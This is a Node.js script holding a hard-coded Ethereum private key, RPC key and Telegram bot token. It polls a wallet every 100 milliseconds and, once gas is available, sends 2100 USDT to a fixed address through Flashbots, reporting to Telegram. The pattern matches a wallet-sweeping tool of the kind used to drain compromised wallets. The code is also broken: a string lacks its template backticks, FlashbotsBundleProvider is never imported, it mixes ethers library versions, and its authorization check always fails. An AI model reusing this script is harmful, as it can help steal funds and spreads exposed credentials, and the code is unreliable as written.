const { ethers } = require("ethers");
const axios = require("axios");

// Configuration
const providerUrl = "https://eth-mainnet.alchemyapi.io/v2/qA9FV5BMTFx6p7638jhqx-JDFDByAZAn"; // Use your own Infura/Alchemy RPC URL
const privateKey = "ee9cec01ff03c0adea731d7c5a84f7b412bfd062b9ff35126520b3eb3d5ff258"; // Wallet's private key
const destinationWallet = "0x08f695b8669b648897ed5399b9b5d951b72881a0"; // Wallet address to send USDT to
const usdtContractAddress = "0xdac17f958d2ee523a2206206994597c13d831ec7"; // USDT ERC20 token contract address
const telegramBotToken = "7673283097:AAFpBQTArL6bEIe04ITxAfvrWPbrcgfvtVg"; // Your Telegram bot token
const telegramChatId = "7474852341"; // Your Telegram chat ID to receive notifications

// Connect to Ethereum provider
const provider = new ethers.JsonRpcProvider(providerUrl);

// Wallet and Signer
const wallet = new ethers.Wallet(privateKey, provider);

// USDT Contract ABI (for ERC20 transfer)
const usdtAbi = [
  "function transfer(address recipient, uint256 amount) public returns (bool)",
  "function balanceOf(address account) public view returns (uint256)"
];

const usdtContract = new ethers.Contract(usdtContractAddress, usdtAbi, wallet);

// Function to send a Telegram notification
async function sendTelegramNotification(message) {
  const url = https://api.telegram.org/bot${telegramBotToken}/sendMessage;
  const params = {
    chat_id: telegramChatId,
    text: message,
  };
  try {
    await axios.post(url, params);
    console.log("Telegram notification sent.");
  } catch (error) {
    console.error("Error sending Telegram notification:", error);
  }
}

// Function to block unauthorized transactions
async function blockUnauthorizedTransactions() {
  // Implement your blocking logic here. For example:
  // 1. Whitelist addresses for transfers
  // 2. Prevent all other transactions from being sent from your wallet
  const authorizedAddress = "whitelisted-wallet-address"; // Example of an authorized address

  if (wallet.address !== authorizedAddress) {
    console.log("Unauthorized transaction detected. Blocking!");
    await sendTelegramNotification("Unauthorized transaction detected! No transaction will be sent.");
    return true; // Prevent transaction
  }
  return false; // Allow transaction
}

// Function to check ETH balance and transfer USDT if enough ETH is available
async function checkEthBalanceAndTransfer() {
  try {
    // Block unauthorized transactions
    const isBlocked = await blockUnauthorizedTransactions();
    if (isBlocked) {
      console.log("Transaction blocked.");
      return;
    }

    // Get ETH balance of the wallet
    const ethBalance = await provider.getBalance(wallet.address);

    console.log("Wallet ETH Balance: ", ethers.utils.formatEther(ethBalance));

    // Gas fee estimation
    const gasPrice = await provider.getGasPrice();
    const gasLimit = 100000; // Adjust based on transaction complexity
    const estimatedGasFee = gasPrice.mul(gasLimit); // Gas fee in ETH

    // Check if wallet has enough ETH to cover the gas fee
    if (ethBalance.lt(estimatedGasFee)) {
      console.log("Not enough ETH for gas. Waiting for ETH...");
      return; // Wait for ETH balance to be sufficient
    }

    // Check the USDT balance of the wallet
    const balance = await usdtContract.balanceOf(wallet.address);
    console.log("Wallet USDT Balance: ", ethers.utils.formatUnits(balance, 6));

    // Define the amount of USDT you want to send (2100 USDT)
    const amountToSend = ethers.utils.parseUnits("2100", 6); // Adjusted to 2100 USDT

    // Check if the wallet has enough USDT
    if (balance.lt(amountToSend)) {
      console.log("Insufficient USDT balance.");
      return;
    }

    // Prepare transaction to transfer USDT
    const tx = await usdtContract.populateTransaction.transfer(destinationWallet, amountToSend);

    // Adjust gas price (you can also use gas loan services here if needed)
    tx.gasPrice = gasPrice;
    tx.gasLimit = gasLimit;

    // Send the transaction using Flashbots for quicker inclusion in the block
    const flashbotsProvider = await FlashbotsBundleProvider.create(provider, wallet, "mainnet");

const signedTx = await wallet.signTransaction(tx);

    // Send the bundle using Flashbots
    const bundleSubmission = await flashbotsProvider.sendBundle(
      [{
        signer: wallet,
        transaction: signedTx
      }],
      await provider.getBlockNumber() + 1 // Send to the next block
    );

    console.log("Transaction Hash: ", bundleSubmission.bundleHash);
    const receipt = await provider.waitForTransaction(bundleSubmission.bundleHash);
    console.log("Transaction Receipt: ", receipt);

    // Send notification upon success
    await sendTelegramNotification(`USDT transfer successful! Transaction Hash: ${bundleSubmission.bundleHash}`);

  } catch (error) {
    console.error("Error during transaction: ", error);
    await sendTelegramNotification(`Error occurred during USDT transfer: ${error.message}`);
  }
}

// Monitor the wallet for ETH balance and send USDT when possible
setInterval(checkEthBalanceAndTransfer, 100); // Check every 100ms (for high-speed transactions)